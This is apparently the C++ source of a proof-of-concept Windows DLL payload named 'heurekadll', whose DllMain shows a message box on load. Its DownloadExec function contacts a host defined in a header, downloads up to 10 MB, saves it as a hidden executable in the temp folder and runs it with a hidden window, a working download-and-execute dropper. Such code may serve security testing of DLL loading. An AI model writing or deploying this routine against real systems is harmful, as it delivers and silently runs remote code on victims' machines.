#include<iostream>
#include<Windows.h>
#include<winhttp.h>
#include<Strsafe.h>
#include "heurekadll.h"

namespace heurekadll{

	void Heureka(){
		MessageBox(NULL, L"HeurekaDLL!",L"Heureka",MB_OK);
	}
}

using namespace std;

void DownloadExec(){
	bool exec=true;
	BOOL  bResults = FALSE;
    HINTERNET hSession = NULL,
              hConnect = NULL,
              hRequest = NULL;
	MessageBox(NULL,L"HeurekaDLLDownloadExec",L"Heureka",MB_OK);
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(  L"Heureka", 
                             WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                             WINHTTP_NO_PROXY_NAME, 
                             WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect( hSession, download_exec_host,
                                   INTERNET_DEFAULT_HTTP_PORT, 0);
	else{
		return;
	}

    // Create an HTTP Request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest( hConnect, L"POST", 
                                       download_exec_resource, 
                                       NULL, WINHTTP_NO_REFERER, 
                                       WINHTTP_DEFAULT_ACCEPT_TYPES,
                                       0);
	else{
		WinHttpCloseHandle(hSession);
		return;
	}

    // Send a Request.

    if (hRequest) {
		bResults = WinHttpSendRequest( hRequest, 
                                       WINHTTP_NO_ADDITIONAL_HEADERS,
                                       0, WINHTTP_NO_REQUEST_DATA, 0, 
                                       0, 0);
	}else{
		
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		return;
	}
 

    // Report any errors.
    if (!bResults){
        
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
	}else{
		DWORD bytesRead=0;
		//LPVOID responseBuf[10240];
		void *responseBuf=malloc(10240000);
		bResults = WinHttpReceiveResponse( hRequest, NULL);
		WinHttpReadData(hRequest, responseBuf,10240000,&bytesRead);
		
		WinHttpCloseHandle(hRequest);
		WinHttpCloseHandle(hConnect);
		WinHttpCloseHandle(hSession);
		HANDLE hFile;
	
		TCHAR tmppath[MAX_PATH];
		ZeroMemory(tmppath,MAX_PATH);
		DWORD err=GetTempPath(MAX_PATH,tmppath);
		DWORD dwWritten=0;
		if (err>MAX_PATH || err==0){
			return; 
		}
		if (wcscat_s(tmppath,MAX_PATH,TEXT("heureka_downloadexec.exe"))!=0){
			return;
		}

		hFile=CreateFile(tmppath,FILE_GENERIC_WRITE,0,NULL,CREATE_ALWAYS,FILE_ATTRIBUTE_HIDDEN,NULL);
		if (hFile==INVALID_HANDLE_VALUE){
			err=GetLastError();
			
			return; 
		}
		WriteFile(hFile, responseBuf, bytesRead,&dwWritten,NULL);
		CloseHandle(hFile);
		free(responseBuf);
		
		if(exec){
			
			ShellExecute(NULL,TEXT("open"),tmppath,TEXT(""),NULL,SW_HIDE);
		}
	}

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);
	
}


BOOL WINAPI DllMain(
    HINSTANCE hinstDLL,  // handle to DLL module
    DWORD fdwReason,     // reason for calling function
    LPVOID lpReserved )  // reserved
{
    // Perform actions based on the reason for calling.
    if (fdwReason == DLL_PROCESS_ATTACH){
		heurekadll::Heureka();
	}
    return TRUE;  // Successful DLL_PROCESS_ATTACH.
}